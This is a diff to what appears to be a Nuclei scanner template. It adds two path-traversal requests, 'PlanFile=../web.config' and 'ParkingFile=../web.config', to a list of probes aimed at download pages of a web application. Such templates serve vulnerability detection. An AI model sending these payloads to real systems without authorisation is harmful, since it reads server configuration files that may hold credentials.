@@ -16,6 +16,8 @@ http:
       - "{{BaseURL}}/HM/M_Main/InformationManage/ContractDownLoad.aspx?ContractFile=../web.config"
       - "{{BaseURL}}/HM/M_main/InformationManage/OwnerVacantDownLoad.aspx?OwnerVacantFile=../web.config"
       - "{{BaseURL}}/HM/M_main/InformationManage/VacantDiscountDownLoad.aspx?VacantDiscountFile=../web.config"
+      - "{{BaseURL}}/HM/M_Main/InformationManage/PlanDownLoad.aspx?PlanFile=../web.config"
+      - "{{BaseURL}}/HM/M_Main/InformationManage/ParkingFeelFileDownLoad.aspx?ParkingFile=../web.config"
 
     stop-at-first-match: true
     matchers-condition: and
